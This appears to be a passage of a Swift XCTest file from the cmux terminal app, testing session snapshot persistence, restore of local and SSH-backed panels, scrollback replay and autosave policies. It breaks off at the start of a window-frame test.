import XCTest

#if canImport(cmux_DEV)
@testable import cmux_DEV
#elseif canImport(cmux)
@testable import cmux
#endif

final class SessionPersistenceTests: XCTestCase {
    private struct LegacyPersistedWindowGeometry: Codable {
        let frame: SessionRectSnapshot
        let display: SessionDisplaySnapshot?
    }

    @MainActor
    func testWorkspaceSessionSnapshotRestoresMarkdownPanel() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-markdown-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }

        let markdownURL = root.appendingPathComponent("note.md")
        try "# hello\n".write(to: markdownURL, atomically: true, encoding: .utf8)

        let workspace = Workspace()
        let paneId = try XCTUnwrap(workspace.bonsplitController.allPaneIds.first)
        let panel = try XCTUnwrap(
            workspace.newMarkdownSurface(
                inPane: paneId,
                filePath: markdownURL.path,
                focus: true
            )
        )
        workspace.setCustomTitle("Docs")
        workspace.setPanelCustomTitle(panelId: panel.id, title: "Readme")

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)

        let restored = Workspace()
        restored.restoreSessionSnapshot(snapshot)

        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)
        let restoredPanel = try XCTUnwrap(restored.markdownPanel(for: restoredPanelId))
        XCTAssertEqual(restoredPanel.filePath, markdownURL.path)
        XCTAssertEqual(restored.customTitle, "Docs")
        XCTAssertEqual(restored.panelTitle(panelId: restoredPanelId), "Readme")
    }

    @MainActor
    func testSessionSnapshotSkipsTransientRemoteListeningPorts() throws {
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)
        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )

        workspace.configureRemoteConnection(configuration, autoConnect: false)
        workspace.surfaceListeningPorts[panelId] = [6969]

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)
        let panelSnapshot = try XCTUnwrap(snapshot.panels.first { $0.id == panelId })

        XCTAssertTrue(panelSnapshot.listeningPorts.isEmpty)
    }

    @MainActor
    func testSessionSnapshotSetsIsRemoteBackedForRemoteTerminal() throws {
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)
        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )

        workspace.configureRemoteConnection(configuration, autoConnect: false)

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)
        let panelSnapshot = try XCTUnwrap(snapshot.panels.first { $0.id == panelId })

        XCTAssertEqual(panelSnapshot.terminal?.isRemoteBacked, true)
    }

    @MainActor
    func testSessionSnapshotSkipsDetectedCommandForRemoteTerminal() throws {
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)
        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )

        // Seed the foreground cache so this test actually exercises the
        // remote-skip branch in sessionPanelSnapshot. Without seeding, the
        // assertion would pass vacuously even if the guard was deleted.
        SessionForegroundProcessCache.shared._testReplaceCache(["/dev/ttys001": "opencode"])
        defer { SessionForegroundProcessCache.shared._testReplaceCache([:]) }

        workspace.configureRemoteConnection(configuration, autoConnect: false)
        workspace.surfaceTTYNames[panelId] = "/dev/ttys001"

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)
        let panelSnapshot = try XCTUnwrap(snapshot.panels.first { $0.id == panelId })

        XCTAssertNil(
            panelSnapshot.terminal?.detectedCommand,
            "remote-backed panel must drop detectedCommand even when the foreground cache has a value for its TTY"
        )
    }

    @MainActor
    func testSessionSnapshotPreservesDetectedCommandForLocalTerminal() throws {
        // Positive control for testSessionSnapshotSkipsDetectedCommandForRemoteTerminal:
        // proves the suppression is gated on remote-backed status, not a global drop that
        // would mask a regression in detectedCommand persistence for normal local panels.
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)

        SessionForegroundProcessCache.shared._testReplaceCache(["/dev/ttys001": "opencode"])
        defer { SessionForegroundProcessCache.shared._testReplaceCache([:]) }

        workspace.surfaceTTYNames[panelId] = "/dev/ttys001"

        let snapshot = workspace.sessionSnapshot(includeScrollback: false)
        let panelSnapshot = try XCTUnwrap(snapshot.panels.first { $0.id == panelId })

        XCTAssertEqual(
            panelSnapshot.terminal?.detectedCommand,
            "opencode",
            "local panel must preserve detectedCommand from foreground cache so the remote-skip case stays meaningful"
        )
        XCTAssertEqual(panelSnapshot.terminal?.isRemoteBacked, false)
    }

    @MainActor
    func testRestoreRemoteBackedSnapshotSuppressesBothAutoRestoreSources() throws {
        // End-to-end restore-time gate: a remote-backed snapshot with both an agent
        // resume command and an allowlisted detectedCommand must restore with NO
        // initialInput. Without the per-panel `panelWasRemoteBacked` gate in
        // Workspace.createPanel(from:inPane:), one or both would silently get typed
        // into the freshly-restored shell.
        let source = Workspace()
        let sourcePanelId = try XCTUnwrap(source.focusedPanelId)
        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )

        SessionForegroundProcessCache.shared._testReplaceCache(["/dev/ttys001": "opencode"])
        defer { SessionForegroundProcessCache.shared._testReplaceCache([:]) }

        source.configureRemoteConnection(configuration, autoConnect: false)
        source.surfaceTTYNames[sourcePanelId] = "/dev/ttys001"

        let agentIndex = try makeRestorableAgentIndex(
            workspaceId: source.id,
            panelId: sourcePanelId,
            sessionId: "codex-remote-restore-session",
            arguments: ["/usr/local/bin/codex", "--model", "gpt-5.4"]
        )
        let snapshot = source.sessionSnapshot(includeScrollback: false, restorableAgentIndex: agentIndex)

        let restored = Workspace()
        restored.restoreSessionSnapshot(snapshot)
        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)
        let restoredPanel = try XCTUnwrap(restored.terminalPanel(for: restoredPanelId))

        XCTAssertNil(
            restoredPanel.surface.initialInput,
            "remote-backed restore must suppress both agent resume input and detectedCommand"
        )
    }

    @MainActor
    func testRestoreLocalPanelInsideRemoteWorkspacePreservesInitialInput() throws {
        // Regression test for CodeRabbit's MAJOR finding on PR #3237: a panel saved as
        // local (panelWasRemoteBacked=false) inside a workspace whose remote config has
        // been re-established before restore must NOT have its agent resume input
        // silently dropped by `Workspace.newTerminalSurface`'s remote-startup guard.
        //
        // Real-world scenario: user opens local terminal -> runs opencode -> later
        // configures the workspace as SSH -> quits cmux -> on relaunch, the app
        // re-establishes the remote configuration BEFORE replaying the snapshot.
        //
        // Without the `allowInitialInputWithRemoteStartupCommand` opt-out plumbed in
        // `createPanel(from:inPane:)`, `safeInitialInput` would unconditionally nil
        // the agent resume command and the user would lose their resumable session.
        let source = Workspace()
        let sourcePanelId = try XCTUnwrap(source.focusedPanelId)
        let agentIndex = try makeRestorableAgentIndex(
            kind: .codex,
            workspaceId: source.id,
            panelId: sourcePanelId,
            sessionId: "codex-local-in-remote-session",
            arguments: ["/usr/local/bin/codex", "--model", "gpt-5.4"]
        )
        // Snapshot is taken while workspace is local, so panel.isRemoteBacked == false
        // and the snapshot carries the agent resume command.
        let snapshot = source.sessionSnapshot(includeScrollback: false, restorableAgentIndex: agentIndex)

        // Restore into a workspace that has had its remote configuration re-established
        // first (mirrors AppDelegate's restore order).
        let restored = Workspace()
        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )
        restored.configureRemoteConnection(configuration, autoConnect: false)
        restored.restoreSessionSnapshot(snapshot)

        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)
        let restoredPanel = try XCTUnwrap(restored.terminalPanel(for: restoredPanelId))

        XCTAssertNotNil(
            restoredPanel.surface.initialInput,
            "local-in-remote panel must preserve agent resume input on restore (regression for #3237 review)"
        )
        XCTAssertTrue(
            restoredPanel.surface.initialInput?.contains("codex") == true,
            "preserved input must be the agent resume command, not stale state"
        )
    }

    @MainActor
    func testAllTerminalTTYNamesExcludesRemoteTerminals() throws {
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)

        workspace.surfaceTTYNames[panelId] = "/dev/ttys001"
        XCTAssertEqual(workspace.allTerminalTTYNames(), ["/dev/ttys001"])

        let configuration = WorkspaceRemoteConfiguration(
            destination: "cmux-macmini",
            port: nil,
            identityFile: nil,
            sshOptions: [],
            localProxyPort: nil,
            relayPort: 64001,
            relayID: "relay-test",
            relayToken: String(repeating: "c", count: 64),
            localSocketPath: "/tmp/cmux-test.sock",
            terminalStartupCommand: "ssh cmux-macmini"
        )

        workspace.configureRemoteConnection(configuration, autoConnect: false)

        // configureRemoteConnection clears surfaceTTYNames during promotion;
        // re-seed so the assertion proves the helper FILTERS the remote panel
        // rather than just observing an empty dictionary.
        workspace.surfaceTTYNames[panelId] = "/dev/ttys001"

        XCTAssertTrue(
            workspace.allTerminalTTYNames().isEmpty,
            "panel is remote-backed; allTerminalTTYNames should filter it even when surfaceTTYNames has an entry"
        )
    }

    func testSaveAndLoadRoundTripWithCustomSnapshotPath() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        let snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))

        let loaded = SessionPersistenceStore.load(fileURL: snapshotURL)
        XCTAssertNotNil(loaded)
        XCTAssertEqual(loaded?.version, SessionSnapshotSchema.currentVersion)
        XCTAssertEqual(loaded?.windows.count, 1)
        XCTAssertEqual(loaded?.windows.first?.sidebar.selection, .tabs)
        let frame = try XCTUnwrap(loaded?.windows.first?.frame)
        XCTAssertEqual(frame.x, 10, accuracy: 0.001)
        XCTAssertEqual(frame.y, 20, accuracy: 0.001)
        XCTAssertEqual(frame.width, 900, accuracy: 0.001)
        XCTAssertEqual(frame.height, 700, accuracy: 0.001)
        XCTAssertEqual(loaded?.windows.first?.display?.displayID, 42)
        let visibleFrame = try XCTUnwrap(loaded?.windows.first?.display?.visibleFrame)
        XCTAssertEqual(visibleFrame.y, 25, accuracy: 0.001)
    }

    func testLoadReopenSessionSnapshotRequiresPreviousSnapshotFile() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let bundleIdentifier = "dev.cmux.tests.\(UUID().uuidString)"
        let activeSnapshotURL = try XCTUnwrap(
            SessionPersistenceStore.defaultSnapshotFileURL(
                bundleIdentifier: bundleIdentifier,
                appSupportDirectory: tempDir
            )
        )
        let previousSnapshotURL = try XCTUnwrap(
            SessionPersistenceStore.manualRestoreSnapshotFileURL(
                bundleIdentifier: bundleIdentifier,
                appSupportDirectory: tempDir
            )
        )

        XCTAssertTrue(
            SessionPersistenceStore.save(
                makeSnapshot(version: SessionSnapshotSchema.currentVersion),
                fileURL: activeSnapshotURL
            )
        )
        XCTAssertNil(
            SessionPersistenceStore.loadReopenSessionSnapshot(
                bundleIdentifier: bundleIdentifier,
                appSupportDirectory: tempDir
            )
        )

        var previousSnapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)
        previousSnapshot.windows[0].sidebar.width = 321
        XCTAssertTrue(SessionPersistenceStore.save(previousSnapshot, fileURL: previousSnapshotURL))

        let loaded = try XCTUnwrap(
            SessionPersistenceStore.loadReopenSessionSnapshot(
                bundleIdentifier: bundleIdentifier,
                appSupportDirectory: tempDir
            )
        )
        XCTAssertEqual(loaded.windows.first?.sidebar.width, 321)
    }

    func testSaveAndLoadRoundTripPreservesWorkspaceCustomColor() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        var snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)
        snapshot.windows[0].tabManager.workspaces[0].customColor = "#C0392B"

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))

        let loaded = SessionPersistenceStore.load(fileURL: snapshotURL)
        XCTAssertEqual(
            loaded?.windows.first?.tabManager.workspaces.first?.customColor,
            "#C0392B"
        )
    }

    func testSaveSkipsRewritingIdenticalSnapshotData() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        let snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))
        let firstFileNumber = try fileNumber(for: snapshotURL)

        XCTAssertTrue(SessionPersistenceStore.save(snapshot, fileURL: snapshotURL))
        let secondFileNumber = try fileNumber(for: snapshotURL)

        XCTAssertEqual(
            secondFileNumber,
            firstFileNumber,
            "Saving identical session data should not replace the snapshot file"
        )
    }

    func testWorkspaceCustomColorDecodeSupportsMissingLegacyField() throws {
        var snapshot = makeSnapshot(version: SessionSnapshotSchema.currentVersion)
        snapshot.windows[0].tabManager.workspaces[0].customColor = nil

        let encoder = JSONEncoder()
        let data = try encoder.encode(snapshot)
        let json = try XCTUnwrap(String(data: data, encoding: .utf8))
        XCTAssertFalse(json.contains("\"customColor\""))

        let decoded = try JSONDecoder().decode(AppSessionSnapshot.self, from: data)
        XCTAssertNil(decoded.windows.first?.tabManager.workspaces.first?.customColor)
    }

    func testLoadRejectsSchemaVersionMismatch() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let snapshotURL = tempDir.appendingPathComponent("session.json", isDirectory: false)
        XCTAssertTrue(SessionPersistenceStore.save(makeSnapshot(version: SessionSnapshotSchema.currentVersion + 1), fileURL: snapshotURL))

        XCTAssertNil(SessionPersistenceStore.load(fileURL: snapshotURL))
    }

    func testDefaultSnapshotPathSanitizesBundleIdentifier() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-session-tests-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let path = SessionPersistenceStore.defaultSnapshotFileURL(
            bundleIdentifier: "com.example/unsafe id",
            appSupportDirectory: tempDir
        )

        XCTAssertNotNil(path)
        XCTAssertTrue(path?.path.contains("com.example_unsafe_id") == true)
    }

    func testRestorePolicySkipsWhenLaunchHasExplicitArguments() {
        let shouldRestore = SessionRestorePolicy.shouldAttemptRestore(
            arguments: ["/Applications/cmux.app/Contents/MacOS/cmux", "--window", "window:1"],
            environment: [:]
        )

        XCTAssertFalse(shouldRestore)
    }

    func testRestorePolicyAllowsFinderStyleLaunchArgumentsOnly() {
        let shouldRestore = SessionRestorePolicy.shouldAttemptRestore(
            arguments: ["/Applications/cmux.app/Contents/MacOS/cmux", "-psn_0_12345"],
            environment: [:]
        )

        XCTAssertTrue(shouldRestore)
    }

    func testRestorePolicySkipsWhenRunningUnderXCTest() {
        let shouldRestore = SessionRestorePolicy.shouldAttemptRestore(
            arguments: ["/Applications/cmux.app/Contents/MacOS/cmux"],
            environment: ["XCTestConfigurationFilePath": "/tmp/xctest.xctestconfiguration"]
        )

        XCTAssertFalse(shouldRestore)
    }

    func testSidebarWidthSanitizationClampsToPolicyRange() {
        XCTAssertEqual(
            SessionPersistencePolicy.sanitizedSidebarWidth(-20),
            SessionPersistencePolicy.minimumSidebarWidth,
            accuracy: 0.001
        )
        XCTAssertEqual(
            SessionPersistencePolicy.sanitizedSidebarWidth(10_000),
            SessionPersistencePolicy.maximumSidebarWidth,
            accuracy: 0.001
        )
        XCTAssertEqual(
            SessionPersistencePolicy.sanitizedSidebarWidth(nil),
            SessionPersistencePolicy.defaultSidebarWidth,
            accuracy: 0.001
        )
    }

    func testSessionRectSnapshotEncodesXYWidthHeightKeys() throws {
        let snapshot = SessionRectSnapshot(x: 101.25, y: 202.5, width: 903.75, height: 704.5)
        let data = try JSONEncoder().encode(snapshot)
        let object = try XCTUnwrap(try JSONSerialization.jsonObject(with: data) as? [String: Double])

        XCTAssertEqual(Set(object.keys), Set(["x", "y", "width", "height"]))
        XCTAssertEqual(try XCTUnwrap(object["x"]), 101.25, accuracy: 0.001)
        XCTAssertEqual(try XCTUnwrap(object["y"]), 202.5, accuracy: 0.001)
        XCTAssertEqual(try XCTUnwrap(object["width"]), 903.75, accuracy: 0.001)
        XCTAssertEqual(try XCTUnwrap(object["height"]), 704.5, accuracy: 0.001)
    }

    func testSessionBrowserPanelSnapshotHistoryRoundTrip() throws {
        let profileID = try XCTUnwrap(UUID(uuidString: "8F03A658-5A84-428B-AD03-5A6D04692F64"))
        let source = SessionBrowserPanelSnapshot(
            urlString: "https://example.com/current",
            profileID: profileID,
            shouldRenderWebView: true,
            pageZoom: 1.2,
            developerToolsVisible: true,
            backHistoryURLStrings: [
                "https://example.com/a",
                "https://example.com/b"
            ],
            forwardHistoryURLStrings: [
                "https://example.com/d"
            ]
        )

        let data = try JSONEncoder().encode(source)
        let decoded = try JSONDecoder().decode(SessionBrowserPanelSnapshot.self, from: data)
        XCTAssertEqual(decoded.urlString, source.urlString)
        XCTAssertEqual(decoded.profileID, source.profileID)
        XCTAssertEqual(decoded.backHistoryURLStrings, source.backHistoryURLStrings)
        XCTAssertEqual(decoded.forwardHistoryURLStrings, source.forwardHistoryURLStrings)
    }

    func testSessionBrowserPanelSnapshotHistoryDecodesWhenKeysAreMissing() throws {
        let json = """
        {
          "urlString": "https://example.com/current",
          "shouldRenderWebView": true,
          "pageZoom": 1.0,
          "developerToolsVisible": false
        }
        """.data(using: .utf8)!

        let decoded = try JSONDecoder().decode(SessionBrowserPanelSnapshot.self, from: json)
        XCTAssertEqual(decoded.urlString, "https://example.com/current")
        XCTAssertNil(decoded.profileID)
        XCTAssertNil(decoded.backHistoryURLStrings)
        XCTAssertNil(decoded.forwardHistoryURLStrings)
    }

    func testScrollbackReplayEnvironmentWritesReplayFile() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-scrollback-replay-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let environment = SessionScrollbackReplayStore.replayEnvironment(
            for: "line one\nline two\n",
            tempDirectory: tempDir
        )

        let path = environment[SessionScrollbackReplayStore.environmentKey]
        XCTAssertNotNil(path)
        XCTAssertTrue(path?.hasPrefix(tempDir.path) == true)

        guard let path else { return }
        let contents = try? String(contentsOfFile: path, encoding: .utf8)
        XCTAssertEqual(contents, "line one\nline two\n")
    }

    func testScrollbackReplayEnvironmentSkipsWhitespaceOnlyContent() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-scrollback-replay-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let environment = SessionScrollbackReplayStore.replayEnvironment(
            for: " \n\t  ",
            tempDirectory: tempDir
        )

        XCTAssertTrue(environment.isEmpty)
    }

    func testScrollbackReplayEnvironmentPreservesANSIColorSequences() {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-scrollback-replay-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let red = "\u{001B}[31m"
        let reset = "\u{001B}[0m"
        let source = "\(red)RED\(reset)\n"
        let environment = SessionScrollbackReplayStore.replayEnvironment(
            for: source,
            tempDirectory: tempDir
        )

        guard let path = environment[SessionScrollbackReplayStore.environmentKey] else {
            XCTFail("Expected replay file path")
            return
        }

        guard let contents = try? String(contentsOfFile: path, encoding: .utf8) else {
            XCTFail("Expected replay file contents")
            return
        }

        XCTAssertTrue(contents.contains("\(red)RED\(reset)"))
        XCTAssertTrue(contents.hasPrefix(reset))
        XCTAssertTrue(contents.hasSuffix(reset))
    }

    func testSessionScrollbackPersistenceHonorsReportedShellState() {
        XCTAssertTrue(
            Workspace.shouldPersistSessionScrollback(
                shellActivityState: .promptIdle,
                fallbackNeedsConfirmClose: true
            )
        )
        XCTAssertFalse(
            Workspace.shouldPersistSessionScrollback(
                shellActivityState: .commandRunning,
                fallbackNeedsConfirmClose: false
            )
        )
        XCTAssertFalse(
            Workspace.shouldPersistSessionScrollback(
                shellActivityState: .unknown,
                fallbackNeedsConfirmClose: true
            )
        )
        XCTAssertTrue(
            Workspace.shouldPersistSessionScrollback(
                shellActivityState: nil,
                fallbackNeedsConfirmClose: false
            )
        )
    }

    func testTruncatedScrollbackAvoidsLeadingPartialANSICSISequence() {
        let maxChars = SessionPersistencePolicy.maxScrollbackCharactersPerTerminal
        let source = "\u{001B}[31m"
            + String(repeating: "X", count: maxChars - 7)
            + "\u{001B}[0m"

        guard let truncated = SessionPersistencePolicy.truncatedScrollback(source) else {
            XCTFail("Expected truncated scrollback")
            return
        }

        XCTAssertFalse(truncated.hasPrefix("31m"))
        XCTAssertFalse(truncated.hasPrefix("[31m"))
        XCTAssertFalse(truncated.hasPrefix("m"))
    }

    func testNormalizedExportedScreenPathAcceptsAbsoluteAndFileURL() {
        XCTAssertEqual(
            TerminalController.normalizedExportedScreenPath("/tmp/cmux-screen.txt"),
            "/tmp/cmux-screen.txt"
        )
        XCTAssertEqual(
            TerminalController.normalizedExportedScreenPath(" file:///tmp/cmux-screen.txt "),
            "/tmp/cmux-screen.txt"
        )
    }

    func testNormalizedExportedScreenPathRejectsRelativeAndWhitespace() {
        XCTAssertNil(TerminalController.normalizedExportedScreenPath("relative/path.txt"))
        XCTAssertNil(TerminalController.normalizedExportedScreenPath("   "))
        XCTAssertNil(TerminalController.normalizedExportedScreenPath(nil))
    }

    func testShouldRemoveExportedScreenDirectoryOnlyWithinTemporaryRoot() {
        let tempRoot = URL(fileURLWithPath: "/tmp")
            .appendingPathComponent("cmux-export-tests-\(UUID().uuidString)", isDirectory: true)
        let tempFile = tempRoot
            .appendingPathComponent(UUID().uuidString, isDirectory: true)
            .appendingPathComponent("screen.txt", isDirectory: false)
        let outsideFile = URL(fileURLWithPath: "/Users/example/screen.txt")

        XCTAssertTrue(
            TerminalController.shouldRemoveExportedScreenDirectory(
                fileURL: tempFile,
                temporaryDirectory: tempRoot
            )
        )
        XCTAssertFalse(
            TerminalController.shouldRemoveExportedScreenDirectory(
                fileURL: outsideFile,
                temporaryDirectory: tempRoot
            )
        )
    }

    func testShouldRemoveExportedScreenFileOnlyWithinTemporaryRoot() {
        let tempRoot = URL(fileURLWithPath: "/tmp")
            .appendingPathComponent("cmux-export-tests-\(UUID().uuidString)", isDirectory: true)
        let tempFile = tempRoot
            .appendingPathComponent(UUID().uuidString, isDirectory: true)
            .appendingPathComponent("screen.txt", isDirectory: false)
        let outsideFile = URL(fileURLWithPath: "/Users/example/screen.txt")

        XCTAssertTrue(
            TerminalController.shouldRemoveExportedScreenFile(
                fileURL: tempFile,
                temporaryDirectory: tempRoot
            )
        )
        XCTAssertFalse(
            TerminalController.shouldRemoveExportedScreenFile(
                fileURL: outsideFile,
                temporaryDirectory: tempRoot
            )
        )
    }

    func testWindowUnregisterSnapshotPersistencePolicy() {
        XCTAssertTrue(AppDelegate.shouldPersistSnapshotOnWindowUnregister(isTerminatingApp: false))
        XCTAssertFalse(AppDelegate.shouldPersistSnapshotOnWindowUnregister(isTerminatingApp: true))
    }

    func testShouldSkipSessionSaveDuringRestorePolicy() {
        XCTAssertTrue(
            AppDelegate.shouldSkipSessionSaveDuringRestore(
                isApplyingSessionRestore: true,
                includeScrollback: false
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionSaveDuringRestore(
                isApplyingSessionRestore: true,
                includeScrollback: true
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionSaveDuringRestore(
                isApplyingSessionRestore: false,
                includeScrollback: false
            )
        )
    }

    func testSessionAutosaveTickPolicySkipsWhenTerminating() {
        XCTAssertTrue(
            AppDelegate.shouldRunSessionAutosaveTick(isTerminatingApp: false)
        )
        XCTAssertFalse(
            AppDelegate.shouldRunSessionAutosaveTick(isTerminatingApp: true)
        )
    }

    func testSessionSnapshotSynchronousWritePolicy() {
        XCTAssertFalse(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: false,
                includeScrollback: false
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: false,
                includeScrollback: true
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: true,
                includeScrollback: false
            )
        )
        XCTAssertTrue(
            AppDelegate.shouldWriteSessionSnapshotSynchronously(
                isTerminatingApp: true,
                includeScrollback: true
            )
        )
    }

    func testRestoreCompletionSavePolicySkipsManualReopen() {
        XCTAssertTrue(
            AppDelegate.shouldSaveSessionSnapshotOnRestoreCompletion(
                isManualReopen: false
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSaveSessionSnapshotOnRestoreCompletion(
                isManualReopen: true
            )
        )
    }

    func testUnchangedAutosaveFingerprintSkipsWithinStalenessWindow() {
        let now = Date()
        XCTAssertTrue(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: false,
                includeScrollback: false,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-5),
                now: now,
                maximumAutosaveSkippableInterval: 60
            )
        )
    }

    func testUnchangedAutosaveFingerprintDoesNotSkipAfterStalenessWindow() {
        let now = Date()
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: false,
                includeScrollback: false,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-120),
                now: now,
                maximumAutosaveSkippableInterval: 60
            )
        )
    }

    func testUnchangedAutosaveFingerprintNeverSkipsTerminatingOrScrollbackWrites() {
        let now = Date()
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: true,
                includeScrollback: false,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-1),
                now: now
            )
        )
        XCTAssertFalse(
            AppDelegate.shouldSkipSessionAutosaveForUnchangedFingerprint(
                isTerminatingApp: false,
                includeScrollback: true,
                previousFingerprint: 1234,
                currentFingerprint: 1234,
                lastPersistedAt: now.addingTimeInterval(-1),
                now: now
            )
        )
    }

    func testSessionAutosaveFingerprintIncludesRestorableAgentMetadata() throws {
        let workspaceId = UUID()
        let panelId = UUID()
        let baselineFingerprint = TabManager.restorableAgentSnapshotFingerprint(nil)

        let firstIndex = try makeRestorableAgentIndex(
            workspaceId: workspaceId,
            panelId: panelId,
            sessionId: "codex-session-1",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4",
                "resume",
                "codex-session-1",
            ]
        )
        let firstFingerprint = TabManager.restorableAgentSnapshotFingerprint(
            try XCTUnwrap(firstIndex.snapshot(workspaceId: workspaceId, panelId: panelId))
        )

        let secondIndex = try makeRestorableAgentIndex(
            workspaceId: workspaceId,
            panelId: panelId,
            sessionId: "codex-session-2",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4-mini",
                "resume",
                "codex-session-2",
            ]
        )
        let secondFingerprint = TabManager.restorableAgentSnapshotFingerprint(
            try XCTUnwrap(secondIndex.snapshot(workspaceId: workspaceId, panelId: panelId))
        )

        XCTAssertNotEqual(baselineFingerprint, firstFingerprint)
        XCTAssertNotEqual(firstFingerprint, secondFingerprint)
    }

    func testResolvedWindowFramePrefersSavedDisplayIdentity() {
